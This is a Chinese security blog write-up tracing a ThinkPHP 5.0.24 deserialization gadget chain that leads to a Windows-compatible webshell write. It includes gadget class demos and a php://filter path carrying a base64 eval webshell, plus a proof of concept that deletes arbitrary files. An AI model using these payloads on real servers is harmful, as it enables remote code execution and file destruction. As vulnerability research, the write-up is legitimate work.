# 一次Thinkphp 5.0.X 反序列化的坎坷

阅读量 **141537**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-18 15:30:13

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t018e2f2f2660a2f600.jpg)

## 前言

并非专业选手、本文如有出错的地方，还请师傅们帮忙斧正，也是记录一下在项目中遇到thinkphp windows 环境下 RCE的踩坑。

事情就是图片这样，由于文件名的问题无法在WIndow环境下写入文件， 然后search到几篇解决Windows 文件名的文章，来拼凑解决这次的坎坷。

![](https://p0.ssl.qhimg.com/t01f741c8051a705f03.png)

## 调试环境

Apache2.4.39 PHP7.1.9nts Thinkphp5.0.24  
在 application\index\controller\index.php 修改代码如下，创建反序列化接收。

    
    
    <?php
    namespace app\index\controller;
    
    class Index
    {
        public function index($value='')
        {
            echo "0xdd Test Thinkphp 5.0.24 unserialize  Check input value </br> ";
            echo $value;
            unserialize($value);
        }
    }
    

![](https://p4.ssl.qhimg.com/t01e38bbfd1224cb5a6.png)

## 反序列化链调试

ThinkPHP5
采用命名空间方式定义和自动加载类库文件，只需要给类库正确定义所在的命名空间，并且命名空间的路径与类库文件的目录一致，那么就可以实现类的自动加载，从而实现真正的惰性加载。了解基础知识后，有助于我们POP链脚本的编写。

  * demo

    
    
    namespace think\cache\driver;
    
    class File 
    {
    }
    

实例化该类

    
    
    $class = new \think\cache\driver\File();
    $class = new \Think\Cache\Driver\File();  //可支持驼峰法命名
    

###  入口点

**__destruct： 和构造函数相反，当对象所在函数调用完毕后执行**

**thinkphp/library/think/process/pipes/Windows.php removeFiles 方法**

![](https://p2.ssl.qhimg.com/t01af65322f541a9e39.png)

这里跟进removeFiles 方法 ，为什么不选择跟进close 方法呢？

![](https://p0.ssl.qhimg.com/t0110cea0b8d2de8f70.png)

close 函数很显然无法作为我们的跳板，removeFiles 函数可以的file_exists 方法可以做为我们的跳板 触发__toString
魔术方法

**__toString：当对象被当做一个字符串使用时调用**

###  _toString跳板

这里的_toString 方法除了Model 是否还有其它选择

![](https://p5.ssl.qhimg.com/t011460ff5297d1a71c.png)

跟进toJson ，在toJson中调用了 toArray 方法

    
    
      public function toArray()
        {
            $item    = [];
            $visible = [];
            $hidden  = [];
    
            $data = array_merge($this->data, $this->relation);
    
            // 过滤属性
            if (!empty($this->visible)) {
                $array = $this->parseAttr($this->visible, $visible);
                $data  = array_intersect_key($data, array_flip($array));
            } elseif (!empty($this->hidden)) {
                $array = $this->parseAttr($this->hidden, $hidden, false);
                $data  = array_diff_key($data, array_flip($array));
            }
    
            foreach ($data as $key => $val) {
                if ($val instanceof Model || $val instanceof ModelCollection) {
                    // 关联模型对象
                    $item[$key] = $this->subToArray($val, $visible, $hidden, $key);
                } elseif (is_array($val) && reset($val) instanceof Model) {
                    // 关联模型数据集
                    $arr = [];
                    foreach ($val as $k => $value) {
                        $arr[$k] = $this->subToArray($value, $visible, $hidden, $key);
                    }
                    $item[$key] = $arr;
                } else {
                    // 模型属性
                    $item[$key] = $this->getAttr($key);
                }
            }
            // 追加属性（必须定义获取器）
            if (!empty($this->append)) {
                foreach ($this->append as $key => $name) {
                    if (is_array($name)) {
                        // 追加关联对象属性
                        $relation   = $this->getAttr($key);
                        $item[$key] = $relation->append($name)->toArray();
                    } elseif (strpos($name, '.')) {
                        list($key, $attr) = explode('.', $name);
                        // 追加关联对象属性
                        $relation   = $this->getAttr($key);
                        $item[$key] = $relation->append([$attr])->toArray();
                    } else {
                        $relation = Loader::parseName($name, 1, false);
                        if (method_exists($this, $relation)) {
                            $modelRelation = $this->$relation();
                            $value         = $this->getRelationData($modelRelation);
    
                            if (method_exists($modelRelation, 'getBindAttr')) {
                                $bindAttr = $modelRelation->getBindAttr();
                                if ($bindAttr) {
                                    foreach ($bindAttr as $key => $attr) {
                                        $key = is_numeric($key) ? $attr : $key;
                                        if (isset($this->data[$key])) {
                                            throw new Exception('bind attr has exists:' . $key);
                                        } else {
                                            $item[$key] = $value ? $value->getAttr($attr) : null;
                                        }
                                    }
                                    continue;
                                }
                            }
                            $item[$name] = $value;
                        } else {
                            $item[$name] = $this->getAttr($name);
                        }
                    }
                }
            }
            return !empty($item) ? $item : [];
        }
    

在toArray的方法中，例如可尝试通过 **$item[$key] = $value ? $value- >getAttr($attr) : null;
调用Output类的__call方法**

**__call:当调用对象中不存在的方法会自动调用该方法**

###

###  __call 跳板

![](https://p0.ssl.qhimg.com/t01f2326b06eafc332e.png)

想利用 $item[$key] = $value ? $value->getAttr($attr) : null; ，需要满足条件

![](https://p4.ssl.qhimg.com/t01f45f9e9fa14e4441.png)

当符合检测类存在时、主要关注 **$modelRelation** 和 **$value** 的值

  * **$modelRelation**

**把$relation 修改等于Model 类的getError(), 通过 $thifs- >error $modelRelation 可控**

![](https://p1.ssl.qhimg.com/t018fcac3ee4e06b38f.png)

**$value**

  1. **$this - > parent 为$value 来源，设置值为Output类**
  2. **!$modelRelation- >isSelfRelation() 返回false**
  3. **$modeRelation- >getModel() 返回 Output类**

![](https://p0.ssl.qhimg.com/t01fbf5d075df196f8b.png)

通过getRelationData 方法 我们可以看 我们需要传入的$modelRelation 必须是 Relation
类型,在找类型符合的同时，在905行中 需要有 **getBindAttr()** 方法，该方法处在OneToOne 类中

所以寻找符合的条件为  
1.Relation 类型  
2.该类型包含 **getBindAttr()** 方法

那么我们可不可以直接使用 OneToOne 方法呢， OneToOne 方法符合了条件，但是不符合我们 **!$modelRelation->isSelfRelation() 返回false 的 **需求，所以我们找一个继承OneToOne并含有 **__construct** 即可

![](https://p4.ssl.qhimg.com/t01ae433d58a0dbf25e.png)

例如这里搜索找到的 BelongsTo

![](https://p3.ssl.qhimg.com/t01fe17f88e79832713.png)

demo:

    
    
    class BelongsTo extends OneToOne
    {
        function __construct()
        {
            $this->selfRelation = false;
            $this->query = new Query();
            $this->bindAttr = [1 => "0xdd"];
        }
    }
    

![](https://p0.ssl.qhimg.com/t01b79399e709e15179.png)

这样我们就符合了代码中的判断条件进入else，在 **$item[$key] = $value ? $value- >getAttr($attr) :
null; 执行OutPut 的__call 方法**

**看到这里可能会忘记上面的内容，回顾一下，这里的 $value 已经通过 $this - > parent 为$value
来源，设置值为Output类**

![](https://p5.ssl.qhimg.com/t0198bdac30ebf9b719.png)

**那么此时 也就是 从OutPut类中调用getAttr 方法，由于Output类中没有getAttr方法 所以触发__call ，**

![](https://p1.ssl.qhimg.com/t015819ce31ded2cf96.png)

**Output __call 方法内容**

![](https://p5.ssl.qhimg.com/t015fd6d4589f0e2fa8.png)

**$attr 因为是通过** $bindAttr = $modelRelation->getBindAttr(); 获取值，bindAttr 可控
所以$attr 也可控

![](https://p1.ssl.qhimg.com/t01c61193e6872aaffd.png)

![](https://p0.ssl.qhimg.com/t015a649392375f0039.png)

###  写文件

在进入第一个if 的时候，会通过call_user_func_array 调用 block 方法

![](https://p4.ssl.qhimg.com/t014408c93f205928e0.png)

block 方法中调用了writeln 继续跟进

![](https://p4.ssl.qhimg.com/t01bb96f8b5bb4ec3e7.png)

writeln 调用了 write

![](https://p5.ssl.qhimg.com/t01ffc54032bd856902.png)

write 方法中的 handle 我们是可控的，所以我们要寻找一个类 含有write 方法，此方法可以帮助我们写webshell

![](https://p2.ssl.qhimg.com/t01d0351e066093cfbf.png)

通过搜索，在Memcache 中的write 方法可以为我们找一个set的方法 协助写文件，这里的handler
可控，所以我们要继续寻找符合条件的set方法

![](https://p0.ssl.qhimg.com/t0140e30564c6037ae7.png)

这里以 think\cache\driver\FIle 中的 set 方法为例 ，利用 file_put_contents 写入Webshell,
$filename 也就是文件名 会经过getCacheKey 处理，这里会出现一个linux 和 Windows
环境的利用问题，因为在公布的POC中，写出的Webshell 文件名带有“<” 符号，Windows下 文件名是不能出现“<”符号等….​

如下图的

![](https://p2.ssl.qhimg.com/t017134d467757c9935.png)

![](https://p0.ssl.qhimg.com/t0129a6f8e5a848f5dc.png)

//此payload 不可以在Windows 下写文件

写入内容来自$data, 在没有进入 if($result) 的setTagItem 中时，$data 的值来自 $value ，$expire
只能为数字, $value 在 通过Output类中的writeln 传参过来的时候值为 true

![](https://p2.ssl.qhimg.com/t01a8ec98c4a7ce9de2.png)

关键在进入if($result) 时，setTagItem 方法可以继续set

![](https://p5.ssl.qhimg.com/t01aea47e15f5c96955.png)

在setTagItem 方法中 再次调用set方法，此时set 方法使用 文件名中的内容作为$value ， 那么我们我的写入内容就可控了，下面只要绕过
exit(）即可，绕过exit 需要filename 可控，使用伪协议

    
    
    php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
    

​base64编码中包含64个可打印字符,而当PHP解码base64时，遇到不在其中的字符时，会选择 **跳过**
这些字符，将有效的字符重新组成字符串进行解码,<、?、;、>、空格等字符不符合base64解码范围. 所以可以用伪协议进行绕过。

跟进set 方法中的 getCacheKey，可以发现$filename 的文件名 来自属性 $this->options[‘path’]
,所以也是可控的，

![](https://p1.ssl.qhimg.com/t01a644f5059e41ea3a.png)

那么我们的链，就完成了，具体在伪协议的方法 影响写入的文件名。

## Write_Shell

demo

    
    
    namespace think\cache\driver;
    class File
    {
        protected $options = [];
        protected $tag;
    
        function __construct()
        {
            $this->options = [
                'expire' => 'a',
                'cache_subdir' => false,
                'prefix' => '',
                'path' => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=dddPD9waHAgQGV2YWwoJF9SRVFVRVNUWycweGRkJ10pOz8+IA==/../0xdd.php',
                'data_compress' => false,
            ];
            $this->tag = true;
        }
    
        public function get_filename()
        {
            $name = md5('tag_' . md5($this->tag));
            $filename = $this->options['path'];
            $pos = strpos($filename, "resource=");
            $filename = urlencode(substr($filename, $pos + strlen("resource=")));
            return $filename . $name . ".php";
        }
    }
    
    
    
    php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=dddPD9waHAgQGV2YWwoJF9SRVFVRVNUWycweGRkJ10pOz8+IA==/../0xdd.php
    

php过滤器支持列表 <https://www.php.net/manual/en/filters.php>

传入payload 后 会在根目录写入文件

![](https://p1.ssl.qhimg.com/t0184962f8c9b3524f8.png)

执行命令

![](https://p4.ssl.qhimg.com/t01b34b66c7d5a58617.png)

## 任意文件删除

根据入口点，构造其他操作

demo

    
    
    <?php 
    
    namespace think\process\pipes;
    
    abstract class Pipes
    {
    
    }
    
    
    class Windows extends Pipes
    {
        private $files = [];
        function __construct()
        {
            $this->files = ["robots.txt"]; 
        }
    
    }
    
    
    $a=new Windows();
    echo urlencode(serialize($a));
    
    ?>
    

例如删除 robots.txt 文件

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **0xdd** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/265355](/post/id/265355)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [反序列化](/tag/反序列化)
  * [ThinkPHP](/tag/ThinkPHP)

 **+1** __3赞

 __收藏

![](https://p2.ssl.qhimg.com/t01fbe6b3f3ba6fed28.png) 0xdd

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

